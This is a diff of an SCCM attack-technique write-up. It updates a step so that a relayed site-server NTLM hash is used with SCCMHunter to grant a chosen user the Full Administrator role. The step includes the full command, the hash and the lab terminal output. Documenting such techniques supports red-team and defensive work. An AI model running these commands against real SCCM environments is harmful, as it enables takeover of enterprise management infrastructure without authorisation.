@@ -144,18 +144,41 @@ The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that 
     [*] Got hash for 'sccm$@internal.lab': aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b
     ```
 
-5. Use `sccmhunter` to authenticate to the coerced target's own AdminService:
+5. Use `SCCMHunter` to authenticate to an SMS Provider as the site server and grant a user the Full Administrator role:
 
-    ```
-    └─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b -ip 10.10.100.9
-    SCCMHunter v1.0.0 by @garrfoster
-    [21:23:25] INFO     [!] Enter help for extra shell commands
-    () C:\ >> show_admins
-    [21:23:31] INFO     Tasked SCCM to list current SMS Admins.
-    [21:23:31] INFO     Current Full Admin Users:
-    [21:23:31] INFO     LAB\Administrator
-    [21:23:31] INFO     LAB\lowpriv
-    ```
+```
+└─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b -ip 10.10.100.9
+    
+[06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
+() C:\ >> show_admins 
+[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
+[06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
+[06:53:11 PM] INFO     lab\Administrator                                                                                                                     
+() (C:\) >> get_user specter
+[06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
+[06:53:13 PM] INFO     [+] User found.                                                                                                                       
+[06:53:14 PM] INFO     ------------------------------------------                                                                                            
+                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
+                       FullDomainName: INTERNAL.LAB                                                                                                          
+                       FullUserName: specter                                                                                                              
+                       Mail:                                                                                                                                 
+                       NetworkOperatingSystem: Windows NT                                                                                                    
+                       ResourceId: 2063597574                                                                                                                
+                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
+                       UniqueUserName: lab\specter                                                                                                           
+                       UserAccountControl: 66048                                                                                                             
+                       UserName: specter                                                                                                           
+                       UserPrincipalName: specter@internal.lab                                                                                        
+                       ------------------------------------------                                                                                            
+() (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
+[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
+[06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
+() (C:\) >> show_admins 
+[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
+[06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
+[06:53:20 PM] INFO     lab\Administrator                                                                                                                     
+[08:46:39 PM] INFO     specter 
+```
 
 ## References
 - Will Schroeder and Lee Chagolla-Christensen, [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
